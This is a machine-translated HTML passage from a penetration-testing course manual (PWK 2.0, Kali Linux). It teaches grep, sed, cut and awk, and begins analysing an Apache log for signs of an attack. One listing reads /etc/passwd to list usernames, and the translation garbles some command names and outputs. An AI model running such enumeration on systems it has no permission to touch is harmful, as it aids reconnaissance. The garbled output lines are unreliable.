<div style="position:absolute;top:65783;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rwxr-xr-x 1 根 105172 2016 年 3 月 14 日 gzip</font></font></nobr></div>
<div style="position:absolute;top:65802;left:280"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 43 - 在 /usr/bin 中搜索任何包含“zip”的文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:65831;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在清单 43 中，我们使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">列出了 /usr/bin 目录中的所有文件，</font><font style="vertical-align: inherit;">并将输出通过管道</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">传送</font></font></b><font style="vertical-align: inherit;">到</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">grep</font></font></font></b></nobr></div>
<div style="position:absolute;top:65851;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令，它搜索包含字符串“zip”的任何行。</font><font style="vertical-align: inherit;">了解</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">grep</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">工具和</font></font></nobr></div>
<div style="position:absolute;top:65871;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">何时使用它可以证明非常有用。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:65905;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.3.2 sed</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:65943;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sed </font></font></b><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">57</font></font></font><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是一个强大的流编辑器。</font><font style="vertical-align: inherit;">它也非常复杂，所以我们只会简要介绍一下它的表面</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:65962;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这里。</font><font style="vertical-align: inherit;">在非常高的层次上，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sed</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对文本流执行文本编辑，或者是一组特定的文件</font></font></nobr></div>
<div style="position:absolute;top:65982;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或标准输出。</font><font style="vertical-align: inherit;">让我们看一个例子：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:66016;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo "我需要努力" | </font><font style="vertical-align: inherit;">sed 's/hard/harder/'</font></font></font></b></nobr></div>
<div style="position:absolute;top:66033;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我需要更加努力</font></font></nobr></div>
<div style="position:absolute;top:66053;left:316"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 44 - 替换输出流中的单词</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:66082;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在清单 44 中，我们使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">创建了一个文本流，</font><font style="vertical-align: inherit;">然后</font><font style="vertical-align: inherit;">按顺序将</font><font style="vertical-align: inherit;">它传送到</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sed</font></font></font></b><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:66102;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用“更难”代替“硬”字。</font><font style="vertical-align: inherit;">请注意，默认情况下，输出已自动</font></font></nobr></div>
<div style="position:absolute;top:66121;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">重定向到标准输出。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:66155;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.3.3 切割</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:66193;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">切口</font></font></font></b><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">58</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的命令很简单，但是常常表现出很方便。</font><font style="vertical-align: inherit;">它用于提取一段文本</font></font></nobr></div>
<div style="position:absolute;top:66213;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从一行输出到标准输出。</font><font style="vertical-align: inherit;">一些最常用的开关</font></font></nobr></div>
<div style="position:absolute;top:66232;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包括</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-f</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于我们正在切割的字段编号和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-d</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于字段分隔符。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:66267;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo "我会破解二进制文件、网络应用程序、移动应用程序和其他任何东西"</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:66284;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">cut -f 2 -d ","</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:66301;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络应用程序</font></font></nobr></div>
<div style="position:absolute;top:66320;left:258"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 45 - 使用 cut 从 echo 命令输出中提取字段</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:66350;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在清单 45 中，我们回显了一行文本并将其通过管道传送到</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cut</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令以提取第二个字段</font></font></nobr></div>
<div style="position:absolute;top:66369;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用逗号 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">,</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 作为字段分隔符。</font><font style="vertical-align: inherit;">相同的命令可以与文本文件中的行一起使用</font></font></nobr></div>
<div style="position:absolute;top:66389;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如下所示，其中</font><font style="vertical-align: inherit;">使用</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">:</font></font></b><font style="vertical-align: inherit;">作为分隔符</font><font style="vertical-align: inherit;">从</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/etc/passwd 中</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">提取用户列表</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"></font></font></b><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:66408;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检索第一个字段：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:66443;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cut -d ":" -f 1 /etc/passwd</font></font></font></b></nobr></div>
<div style="position:absolute;top:66460;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根</font></font></nobr></div>
<div style="position:absolute;top:66477;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">守护进程</font></font></nobr></div>
<div style="position:absolute;top:66494;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">垃圾桶</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:66555;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">57 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（GNU，2018），https://www.gnu.org/software/sed/manual/sed.html</font></font></font></nobr></div>
<div style="position:absolute;top:66575;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">58 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（die.net，2010），https://linux.die.net/man/1/cut</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:66703;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="57"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 57 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:66736;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:67813;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:67813;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:67813;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">57</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:66832;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统</font></font></nobr></div>
<div style="position:absolute;top:66848;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">同步</font></font></nobr></div>
<div style="position:absolute;top:66865;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">游戏</font></font></nobr></div>
<div style="position:absolute;top:66882;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:66902;left:281"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 46 - 使用 cut 从 /etc/passwd 中提取用户名</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:66933;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.3.4 awk</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:66971;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AWK </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">59</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是一种设计用于文本处理的编程语言，通常用作数据</font></font></nobr></div>
<div style="position:absolute;top:66990;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">提取和报告工具。</font><font style="vertical-align: inherit;">它也非常强大，可能非常复杂，所以我们只会</font></font></nobr></div>
<div style="position:absolute;top:67010;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这里划伤表面。</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">awk</font></font></font></b><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 60</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">常用的开关</font><font style="vertical-align: inherit;">是</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-F</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，它是字段分隔符，</font></font></nobr></div>
<div style="position:absolute;top:67029;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令，输出结果文本。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:67064;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo "hello::there::friend" | </font><font style="vertical-align: inherit;">awk -F "::" '{print $1, $3}'</font></font></font></b></nobr></div>
<div style="position:absolute;top:67081;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">朋友你好</font></font></nobr></div>
<div style="position:absolute;top:67100;left:219"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 47 - 在 awk 中使用多字符分隔符从流中提取字段</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:67130;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在清单 47 中，我们回显一行并将其通过管道传送到 awk 以使用以下命令提取第一个 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$1</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 和第三个 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$3</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 字段</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:67149;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">::</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为字段分隔符。</font><font style="vertical-align: inherit;">我们使用的 cut 和 awk 示例之间最显着的区别</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:67168;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cut</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">只能接受单个字符作为字段分隔符，而</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">awk</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，如清单 47 所示，</font></font></nobr></div>
<div style="position:absolute;top:67188;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更加灵活。</font><font style="vertical-align: inherit;">作为一般经验法则，当您开始使用涉及</font></font></nobr></div>
<div style="position:absolute;top:67207;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">多次</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">剪切</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作，您可能需要考虑切换到</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">awk</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:67242;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.3.5 实际例子</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:67280;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们看一个实际示例，该示例将我们探索过的许多命令联系在一起</font></font></nobr></div>
<div style="position:absolute;top:67299;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">迄今为止。</font></font></nobr></div>
<div style="position:absolute;top:67332;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们得到了一个 Apache HTTP 服务器日志 (http://www.offensive-security.com/pwk-</font></font></nobr></div>
<div style="position:absolute;top:67351;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">files/access_log.txt.gz)，其中包含攻击的证据。</font><font style="vertical-align: inherit;">我们的任务是使用 Bash 命令</font></font></nobr></div>
<div style="position:absolute;top:67370;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检查文件并发现各种信息，例如攻击者是谁以及</font></font></nobr></div>
<div style="position:absolute;top:67390;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器上到底发生了什么。</font></font></nobr></div>
<div style="position:absolute;top:67423;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">head</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wc</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令快速查看日志文件以了解其</font></font></nobr></div>
<div style="position:absolute;top:67442;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结构体。</font><font style="vertical-align: inherit;">所述</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">头</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令显示前10行中一个文件和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WC</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令，伴随着</font></font></nobr></div>
<div style="position:absolute;top:67461;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-l</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项，显示在一个文件中的行的总数。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:67496;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">gunzip access_log.txt.gz</font></font></font></b></nobr></div>
<div style="position:absolute;top:67530;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mv access_log.txt access.log</font></font></font></b></nobr></div>
<div style="position:absolute;top:67564;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">head access.log</font></font></font></b></nobr></div>
<div style="position:absolute;top:67581;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">201.21.152.44 - - [25/Apr/2013:14:05:35 -0700] "GET /favicon.ico HTTP/1.1" 404 89 "-"</font></font></nobr></div>
<div style="position:absolute;top:67598;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“Mozilla/5.0（Windows NT 6.2；WOW64）AppleWebKit/537.31（KHTML，如 Gecko）Chrome/26。</font></font></nobr></div>
<div style="position:absolute;top:67615;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.1410.64 Safari/537.31" "random-site.com"</font></font></nobr></div>
<div style="position:absolute;top:67632;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">70.194.129.34 - - [25/Apr/2013:14:10:48 -0700]“GET /include/jquery.jshowoff.min.js HT</font></font></nobr></div>
<div style="position:absolute;top:67649;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TP/1.1" 200 2553 "http://www.random-site.com/" "Mozilla/5.0 (Linux; U; Android 4.1.2;</font></font></nobr></div>
<div style="position:absolute;top:67666;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">en-我们; </font><font style="vertical-align: inherit;">SCH-I535 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobil</font></font></nobr></div>
<div style="position:absolute;top:67683;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">e Safari/534.30" "www.random-site.com"</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:67743;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">59 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/AWK</font></font></font></nobr></div>
<div style="position:absolute;top:67763;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">60 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（GNU，2019），https://www.gnu.org/software/gawk/manual/gawk.html</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:67891;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="58"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 58 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:67924;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:69001;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:69001;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:69001;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">58</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:68020;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:68053;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wc -l access.log</font></font></font></b></nobr></div>
<div style="position:absolute;top:68070;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第1173章</font></font></nobr></div>
<div style="position:absolute;top:68090;left:259"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 48 - 查看 access.log 文件以了解其结构</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:68119;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，日志文件是基于文本的，并且包含不同的字段（IP 地址、时间戳、HTTP</font></font></nobr></div>
<div style="position:absolute;top:68139;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请求等) 以空格分隔。</font><font style="vertical-align: inherit;">这是一个完美的“grep 友好”文件，并且运行良好</font></font></nobr></div>
<div style="position:absolute;top:68158;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对于我们迄今为止介绍的所有工具。</font><font style="vertical-align: inherit;">我们将从搜索 HTTP 请求开始</font></font></nobr></div>
<div style="position:absolute;top:68177;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">向服务器发送此日志文件中记录的所有 IP 地址。</font><font style="vertical-align: inherit;">我们将通过管道输出来做到这一点</font></font></nobr></div>
<div style="position:absolute;top:68197;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令转换为</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cut</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sort</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令。</font><font style="vertical-align: inherit;">这可能会给我们提供有关数字的线索</font></font></nobr></div>
<div style="position:absolute;top:68216;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的潜在攻击者，我们将需要处理。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:68251;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat access.log | </font><font style="vertical-align: inherit;">cut -d " " -f 1 | </font><font style="vertical-align: inherit;">排序 -u</font></font></font></b></nobr></div>
<div style="position:absolute;top:68268;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">201.21.152.44</font></font></nobr></div>
<div style="position:absolute;top:68285;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">208.115.113.91</font></font></nobr></div>
<div style="position:absolute;top:68302;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">208.54.80.244</font></font></nobr></div>
<div style="position:absolute;top:68319;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">208.68.234.99</font></font></nobr></div>
<div style="position:absolute;top:68336;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">70.194.129.34</font></font></nobr></div>
<div style="position:absolute;top:68353;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">72.133.47.242</font></font></nobr></div>
<div style="position:absolute;top:68369;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">88.112.192.2</font></font></nobr></div>
<div style="position:absolute;top:68387;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">98.238.13.253</font></font></nobr></div>
<div style="position:absolute;top:68404;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">99.127.177.95</font></font></nobr></div>
<div style="position:absolute;top:68423;left:235"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 49 - 管道命令以从文件中获取所需信息</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:68452;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们看到日志文件中记录的 IP 地址不到十个，尽管这仍然没有说明</font></font></nobr></div>
<div style="position:absolute;top:68472;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们对攻击者有任何了解。</font><font style="vertical-align: inherit;">接下来，我们使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">uniq</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sort</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来显示独特的线条，进一步细化</font></font></nobr></div>
